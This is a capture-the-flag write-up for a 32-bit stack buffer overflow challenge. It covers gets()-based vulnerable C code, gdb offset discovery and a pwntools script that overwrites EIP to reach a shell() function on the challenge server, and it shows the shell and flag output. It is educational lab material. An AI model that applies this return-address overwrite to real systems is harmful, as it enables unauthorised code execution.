# Buffer overflow 4

## Description

> I swear this **gets** will ruin everything.

## Write-Up

### Discovery

The given `C` Code :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>

int shell() {
    printf("Yeah mate! You win!\nOpening your shell...\n");
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
    printf("Shell closed! Bye.\n");
    exit(0);
}

void Hey(){
    printf("Hola StackSmasher : ");
	char buf[30];
    gets(buf);
	return ;
}


int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
	
    Hey();
    return 0;
}
```

Jumping to a more complexe manipulation the the [Buffer overflow 3](../Buffer_overflow_3/solution.md) Challenge where this time, instead of overwrite some pointer variable to call a function instead of another, we will need to overwrite a stack pointer.

As we can see in the code, the `Hey()` function is being called in the `main()`, after that, this function calls the `gets()` function, a vulnerable function that reads data from the user input, which will help us perform our **Buffer Overflow** attack.

The idea of this attack is to overflow the `buf` variable enough to not only overwrite pointers in the stack, but also overwrite the `eip` with the right value so it jumps to the `shell()` function instead of the `main()` function to finish the program :

 > EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.


### Tools used

 - `gdb`
 - `gef` : pritifying of `gdb`, see : https://github.com/hugsy/gef 
 - `nm` : extract addresses of functions inside a binary
 - `cyclic` : gives a bytes cycle sequence to overwrite pointers and variables with.
 - `pwn tools` : binary exploitation tools library of python
 - `gcc-multilib` : this C Compiler enables you to compile C programs to ELF 32-bits or 64-bits, here is how to install it :
   - `sudo apt-get install gcc-multilib`
   - Don't Forget to visit : https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/


### Process

First of all, we need a big enough payload to check in which position the `eip` is being overwritten. To do that, we will use the `cyclic` utility with a large enough sequence length :

```
└─$ cyclic 100    
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

After that, using the `gdb` debugger, let's inject the payload in the program and see the stack state after the **Segmentation fault** :

```
└─$ gdb chall
GNU gdb (Debian 12.1-3) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from ./Buffer_overflow_4/chall...
(No debugging symbols found in ./Buffer_overflow_4/chall)
gef➤  r
Starting program: /home/rivench/Documents/CTFs/mentoring_program/2k22/pwn/Buffer_overflow_4/chall 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hola StackSmasher : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x616c6161 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffced2  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x616a6161 ("aaja"?)
$ecx   : 0xf7e1e9c4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffcf00  →  "aamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa[...]"
$ebp   : 0x616b6161 ("aaka"?)
$esi   : 0x80492f0  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x616c6161 ("aala"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf00│+0x0000: "aamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa[...]"    ← $esp
0xffffcf04│+0x0004: "aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf08│+0x0008: "aaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf0c│+0x000c: "aapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf10│+0x0010: "aaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf14│+0x0014: "aaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf18│+0x0018: "aasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf1c│+0x001c: "aataaauaaavaaawaaaxaaayaaa"
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x616c6161
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x616c6161 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  exit
```

More precisely :

```
...
$eip   : 0x616c6161 ("aala"?)
...
```

we can see that it took `aala` as the address where to go to for contexte restitution. To get the characters needed to overwrite the `eip` pointer then we needed to give `cyclic` command the sustring that the pointer was overwritend with :

```
cyclic -l aala
```

Here is the result

```
42
```

So we need to generate 42 characters to arrive to the `eip` pointer, then give it the address we want so it jumbs to it after finishing with the vuln function.

```
cyclic 42
```

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka
```

Next thing to do is looking for the proper address to put in the `eip` pointer to jump to the `shell()` function. And as we are in the static address mode, we can easily extract the pointer of the function, and it won't change under each execution. To do that, we use the `nm` command, which will give us the **addresses of the functions in the binary, between them the `shell()` function** :

```
└─$ nm chall                               
080481cc r __abi_tag
0804c038 B __bss_start
0804c038 b completed.0
0804c030 D __data_start
0804c030 W data_start
08049120 t deregister_tm_clones
08049100 T _dl_relocate_static_pie
080491a0 t __do_global_dtors_aux
0804bf04 d __do_global_dtors_aux_fini_array_entry
0804c034 D __dso_handle
0804bf08 d _DYNAMIC
0804c038 D _edata
0804c03c B _end
         U exit@GLIBC_2.0
08049358 T _fini
0804a000 R _fp_hw
080491d0 t frame_dummy
0804bf00 d __frame_dummy_init_array_entry
0804a220 r __FRAME_END__
         U geteuid@GLIBC_2.0
         U gets@GLIBC_2.0
0804c000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804a064 r __GNU_EH_FRAME_HDR
0804923f T Hey
08049000 T _init
0804bf04 d __init_array_end
0804bf00 d __init_array_start
0804a004 R _IO_stdin_used
08049350 T __libc_csu_fini
080492f0 T __libc_csu_init
         U __libc_start_main@GLIBC_2.0
08049278 T main
         U printf@GLIBC_2.0
         U puts@GLIBC_2.0
08049160 t register_tm_clones
         U setbuf@GLIBC_2.0
         U setreuid@GLIBC_2.0
080491d6 T shell
080490c0 T _start
         U stderr@GLIBC_2.0
         U stdin@GLIBC_2.0
         U stdout@GLIBC_2.0
         U system@GLIBC_2.0
0804c038 D __TMC_END__
08049351 T __x86.get_pc_thunk.bp
08049110 T __x86.get_pc_thunk.bx
```

More precisely :

```
...
080491d6 T shell
080490c0 T _start
...
```

Now that we have th information we needed, we can create our script that exploit the vulnerability in the source code. we will be using `pwn` tools for that : 

 - First, get the byte version of the address found of the `shell()` function (we can do that manually or using pwn tools) :

```python
# Python 3.10.8 (main, dec 24 2022, 10:07:16) [GCC 12.2.0] on linux
# Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x080491d6)
b'\xd6\x91\x04\x08'
```

 - You may need check the binary in case of a security enabling or ELF format not corresponding to your script :
   - Check for the file ELF (EXEC) (Executable and Linkable Format) :

```
└─$ file chall
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped
```

   - Don't forget also to check the security of the binary given :

```
└─$ checksec chall 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can create a python script for that : 

```python
#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1405'

p = remote(HOST, PORT)

p.sendlineafter(b'Hola StackSmasher : ', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka\xd6\x91\x04\x08')

p.interactive()
```

Local execution :

```
[+] Starting local process './chall': pid 14565
[*] Switching to interactive mode
Yeah mate! You win!
Opening your shell...
$ whoami
rivench
$ ls
chall  chall.c    core  script_local.py  script.py  solution.md
$ exit
Shell closed! Bye.
```

Remote Execution :

```
[+] Opening connection to pwn.challs.ctf.shellmates.club on port 1405: Done
[*] Switching to interactive mode
Yeah mate! You win!
Opening your shell...
$ whoami
nobody
$ ls
chall
entrypoint.sh
flag.txt
$ cat flag.txt
shellmates{Ar3_P30Pl3_ST1LL_U$In9_GETS!!!!}
$ exit
```

After executing that code, first, the pointers will be overwrited of the `chall` program but we will find that the `eip` pointer will be overwrittend with our specific address, this will make him jump to the `shell()` instead of returning to the main function, and after passing checks and execute prints out the flag.

**Note :** in order to run `chall` binary, add execution permissions to it.

```sh
└─$ chmod +x ./chall
```

## Flag

shellmates{Ar3_P30Pl3_ST1LL_U$In9_GETS!!!!}

## More information :

 - https://0xrick.github.io/binary-exploitation/bof3/?fbclid=IwAR2Mppoig0o57gQUBm1YQIGH44tBtqWeRB3Jr56RrAFlTzq96qFj5WR_vp8
 - https://courses.cs.washington.edu/courses/cse374/18sp/lectures/20-buffer-overflows.html?fbclid=IwAR04qbKpLA2emy0_RunFvULwi2qXYSR8-9WtdsawX-bvM5DNWi4l187gOwA
 - https://security.stackexchange.com/questions/172053/how-to-pass-parameters-with-a-buffer-overflow?fbclid=IwAR3PLNV40nBPjhyleXTOnxpZneH-6-cYn-NyxXcXcB_pAXoYRRmzOodOmKU
 - https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html
 - https://en.wikipedia.org/wiki/X86_calling_conventions
 - https://www.google.com/search?q=buffer+overflow+32+bits+calling+convention&client=firefox-b-e&ei=qy11Y8WQK4GskdUPk82UiAI&oq=buffer+overflow+32+bits+calling+conve&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAxgBMgUIIRCgATIFCCEQoAEyBQghEKABOgoIABBHENYEELADOgYIABAWEB46BAghEBU6CAghEBYQHhAdOgcIIRCgARAKSgQIQRgASgQIRhgAUJUCWK8nYNs6aAFwAXgAgAHYA4gBoiCSAQgyLTEwLjIuMpgBAKABAcgBCMABAQ&sclient=gws-wiz-serp
 - https://www.0x0ff.info/2021/advanced-buffer-overflow-bypass-aslr-32-bits/
